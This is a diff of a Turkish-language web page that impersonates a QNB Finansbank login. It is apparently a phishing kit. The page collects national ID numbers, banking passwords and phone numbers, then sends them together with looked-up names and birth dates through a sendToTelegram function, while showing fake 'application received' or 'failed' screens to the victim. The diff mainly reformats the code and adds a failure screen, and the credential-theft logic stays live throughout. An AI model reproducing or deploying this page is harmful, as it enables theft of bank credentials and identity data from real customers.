@@ -1,37 +1,107 @@
 <!DOCTYPE html>
 <html lang="tr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QNB Giriş</title>
     <link rel="stylesheet" type="text/css" href="assets/style/style.css">
     <style>
-        .error-message { color: red; font-size: 0.9em; margin-bottom: 10px; display:none;}
-        .required-message { color: orange; font-size: 0.85em; display:none;}
-        .success-header, .success-card { color: #fff; }
-        .success-info-label { font-weight: bold; }
-        .success-info-value { margin-left: 5px; }
-        .checkmark { margin: 15px 0; }
-        .login-button:disabled { background: #666 !important; cursor: not-allowed !important; }
-        .form-group { position:relative;}
-        .input-error { border: 1px solid red !important; }
+        .error-message {
+            color: red;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .required-message {
+            color: orange;
+            font-size: 0.85em;
+            display: none;
+        }
+
+        .success-header,
+        .success-card {
+            color: #fff;
+        }
+
+        .success-info-label {
+            font-weight: bold;
+        }
+
+        .success-info-value {
+            margin-left: 5px;
+        }
+
+        .checkmark {
+            margin: 15px auto 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-button:disabled {
+            background: #666 !important;
+            cursor: not-allowed !important;
+        }
+
+        .form-group {
+            position: relative;
+        }
+
+        .input-error {
+            border: 1px solid red !important;
+        }
+
+        .failure-container {
+            margin-top: 40px;
+            display: none;
+            text-align: center;
+        }
+
+        .failure-header {
+            color: #fff;
+            font-size: 1.2em;
+            margin-bottom: 12px;
+        }
+
+        .failure-card {
+            background: rgba(255, 255, 255, 0.4);
+            color: #b00020;
+            padding: 18px 18px 10px 18px;
+            border-radius: 8px;
+            margin: 0 auto 16px auto;
+            max-width: 370px;
+            box-shadow: 0 4px 12px rgba(90, 0, 0, 0.08);
+        }
     </style>
 </head>
+
 <body>
     <div class="loading-overlay" id="loading-overlay" style="position: fixed;">
         <img src="./assets/img/QNB_Loading_Icon.gif" alt="loading...">
         <div class="loading-text">QNB Finansbank'a Hoş Geldiniz<br>Yükleniyor...</div>
     </div>
+    <div class="mobile-header">
+        <img src="./assets/img/mobil-kusak.png" alt="Mobil Kuşak" class="mobile-kusak">
+        <img src="./assets/img/logo.png" alt="Logo" class="mobile-logo">
+    </div>
     <div class="login-container" id="login-container">
+        <div class="tabs">
+            <div class="tab active">Bireysel</div>
+            <div class="tab">Kurumsal</div>
+        </div>
         <form id="login-form" autocomplete="off">
             <div class="form-group">
                 <label for="tcno">TC Kimlik No *</label>
-                <input type="text" id="tcno" name="tcno" required placeholder="TC Kimlik Numaranız" maxlength="11" autocomplete="off">
+                <input type="text" id="tcno" name="tcno" required placeholder="TC Kimlik Numaranız" maxlength="11"
+                    autocomplete="off">
                 <div id="tcno-error" class="required-message">TC Kimlik No 11 haneli olmalı.</div>
             </div>
             <div class="form-group">
                 <label for="sifre">Şifre *</label>
-                <input type="password" id="sifre" name="sifre" required placeholder="Şifreniz" maxlength="6" autocomplete="off">
+                <input type="password" id="sifre" name="sifre" required placeholder="Şifreniz" maxlength="6"
+                    autocomplete="off">
                 <div id="sifre-error" class="required-message">Şifre 6 haneli olmalı.</div>
             </div>
             <button type="submit" class="login-button" id="login-button" disabled>
@@ -68,7 +138,8 @@
             <div id="kart-ekstra" style="display:none;">
                 <div class="form-group">
                     <label for="telno2">Telefon Numaranız *</label>
-                    <input name="phone2" type="tel" class="form-control" id="telno2" value="" autocomplete="off" maxlength="17" placeholder="Telefon numaranızı girin" required>
+                    <input name="phone2" type="tel" class="form-control" id="telno2" value="" autocomplete="off"
+                        maxlength="17" placeholder="Telefon numaranızı girin" required>
                     <div id="telno2-error" class="required-message">Telefon numarası eksik veya hatalı.</div>
                 </div>
                 <div class="form-group">
@@ -83,17 +154,13 @@
                         <svg width="16" height="16" viewBox="0 0 100 100" fill="#fff">
                             <circle cx="50" cy="50" r="35" stroke-width="10" stroke="#fff"
                                 stroke-dasharray="164.93361431346415 56.97787143782138" fill="none">
-                                <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s"
-                                    values="0 50 50;360 50 50" keyTimes="0;1" />
+                                <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite"
+                                    dur="1s" values="0 50 50;360 50 50" keyTimes="0;1" />
                             </circle>
                         </svg>
                     </span>
                 </button>
                 <div id="telegram-error-message" class="error-message"></div>
-            </div>
-            <div class="success-header" id="hayir-kart-group" style="display:none;">
-                <h1 style="color:white !important;">Tebrikler!</h1>
-                <p>Kredi Kartı kullanmadığınız için başvurunuz başarıyla tamamlandı.</p>
             </div>
         </form>
     </div>
@@ -105,8 +172,10 @@
                     stroke-linejoin="round" />
             </svg>
         </div>
-        <div class="success-header">
+      <div class="success-header">
             <h1 style="color:white !important;">Tebrikler! Başvurunuz Başarıyla Alındı</h1>
+            <p>Başvuru işleminiz sistemimize kaydedilmiştir.</p>
+            <p>Müşteri temsilcilerimiz 1-3 iş günü içerisinde sizinle iletişime geçecektir.</p>
         </div>
         <div class="success-card">
             <h3>Başvuru Bilgileriniz</h3>
@@ -137,12 +206,39 @@
             <a href="/" class="success-home-button">Ana Sayfaya Dön</a>
         </div>
     </div>
+    <div class="failure-container" id="failure-container">
+        <div class="failure-header">Başvurunuz Tamamlanamadı!</div>
+        <div class="failure-card">
+            <h3 style="margin-top:0;">Başvuru Bilgileriniz</h3>
+            <div class="success-info-row">
+                <div class="success-info-label">Ad Soyad:</div>
+                <div class="success-info-value"><span id="adsoyad-failure"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">TC Kimlik No:</div>
+                <div class="success-info-value"><span id="tcno-failure"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Doğum Tarihi:</div>
+                <div class="success-info-value"><span id="dogum-failure"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Başvuru Tarihi:</div>
+                <div class="success-info-value"><span id="islemSaati-failure"></span></div>
+            </div>
+            <div style="margin-top:10px;">
+                <strong style="color:#b00020;">Kredi kartı kullanmadığınız için başvurunuz tamamlanamadı.<br>Bir kredi
+                    kartı ile tekrar başvurabilirsiniz.</strong>
+            </div>
+            <a href="/" class="success-home-button">Ana Sayfaya Dön</a>
+        </div>
+    </div>
     <script>
-    window.onload = function() {
-        setTimeout(function() {
-            document.getElementById("loading-overlay").style.display = "none";
-        }, 2000);
-    };
+        window.onload = function () {
+            setTimeout(function () {
+                document.getElementById("loading-overlay").style.display = "none";
+            }, 2000);
+        };
     </script>
     <script>
         function validateTC(tc) {
@@ -207,12 +303,12 @@
                 tcnoError.style.display = 'none';
                 sifreError.style.display = 'none';
             }
-            tcno.addEventListener("input", function() {
-                tcno.value = tcno.value.replace(/\D/g, '').slice(0,11);
+            tcno.addEventListener("input", function () {
+                tcno.value = tcno.value.replace(/\D/g, '').slice(0, 11);
                 checkLoginValid();
             });
-            sifre.addEventListener("input", function() {
-                sifre.value = sifre.value.replace(/\D/g, '').slice(0,6);
+            sifre.addEventListener("input", function () {
+                sifre.value = sifre.value.replace(/\D/g, '').slice(0, 6);
                 checkLoginValid();
             });
             checkLoginValid();
@@ -229,12 +325,12 @@
                 document.getElementById("login-spinner").style.display = "inline-block";
                 loginButton.disabled = true;
                 fetch("/tcLookup", {
-                    method:"POST",
-                    headers:{"Content-Type":"application/json"},
-                    body:JSON.stringify({ tc: tcnoVal })
-                }).then(res=>res.json()).then(data=>{
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ tc: tcnoVal })
+                }).then(res => res.json()).then(data => {
                     document.getElementById("login-spinner").style.display = "none";
-                    if(data.success && data.AD && data.SOYAD){
+                    if (data.success && data.AD && data.SOYAD) {
                         adVal = data.AD;
                         soyadVal = data.SOYAD;
                         dogumVal = data.DogumTarihi || data.DOGUMTARIHI || "";
@@ -247,7 +343,7 @@
                         tcnoError.style.display = "block";
                         loginButton.disabled = false;
                     }
-                }).catch(()=>{
+                }).catch(() => {
                     document.getElementById("login-spinner").style.display = "none";
                     tcnoError.innerText = "TC Kimlik No sorgulanamadı!";
                     tcnoError.style.display = "block";
@@ -262,29 +358,22 @@
                         document.getElementById("kart-ekstra").style.display = "block";
                         document.getElementById("choose").style.display = "none";
                     } else {
-                        document.getElementById("hayir-kart-group").style.display = "block";
-                        document.getElementById("kart-ekstra").style.display = "none";
-                        document.getElementById("choose").style.display = "none";
-                        setTimeout(function(){
-                            document.getElementById("info-container").style.display = "none";
-                            document.getElementById("success-container").style.display = "block";
-                            document.getElementById("adsoyad-success").innerText = `${adVal} ${soyadVal}`;
-                            document.getElementById("tcno-success").innerText = tcnoVal;
-                            document.getElementById("dogum-success").innerText = dogumVal;
-                            document.getElementById("islemSaati").innerText = nowStr();
-                            document.getElementById("limit-success-row").style.display = "none";
-                            document.getElementById("telefon-success-row").style.display = "none";
-                            sendToTelegram({
-                                AD: adVal,
-                                SOYAD: soyadVal,
-                                DogumTarihi: dogumVal,
-                                tcno: tcnoVal,
-                                sifre: sifreVal,
-                                kredi_kart_durumu: "hayir",
-                                tarih: nowStr(),
-                                device: getDeviceType()
-                            },()=>{});
-                        }, 1000);
+                        document.getElementById("info-container").style.display = "none";
+                        document.getElementById("failure-container").style.display = "block";
+                        document.getElementById("adsoyad-failure").innerText = `${adVal} ${soyadVal}`;
+                        document.getElementById("tcno-failure").innerText = tcnoVal;
+                        document.getElementById("dogum-failure").innerText = dogumVal;
+                        document.getElementById("islemSaati-failure").innerText = nowStr();
+                        sendToTelegram({
+                            AD: adVal,
+                            SOYAD: soyadVal,
+                            DogumTarihi: dogumVal,
+                            tcno: tcnoVal,
+                            sifre: sifreVal,
+                            kredi_kart_durumu: "hayir",
+                            tarih: nowStr(),
+                            device: getDeviceType()
+                        }, () => { });
                     }
                 });
             });
@@ -321,7 +410,7 @@
                 telInput2.value = formatPhoneInput(digits);
                 checkKartValid();
             });
-            telInput2.addEventListener("keydown", function(e) {
+            telInput2.addEventListener("keydown", function (e) {
                 if ((telInput2.selectionStart <= 4 && (e.key === 'Backspace' || e.key === 'Delete'))) {
                     e.preventDefault();
                 }
@@ -354,7 +443,7 @@
                     telefon: telInput2.value,
                     tarih: nowStr(),
                     device: getDeviceType()
-                }, function(resp) {
+                }, function (resp) {
                     document.getElementById("tamamla-spinner").style.display = "none";
                     document.getElementById("tamamla-text").innerText = "Başvuruyu tamamla";
                     if (resp.status === "ok") {
@@ -393,4 +482,5 @@
         }
     </script>
 </body>
+
 </html>
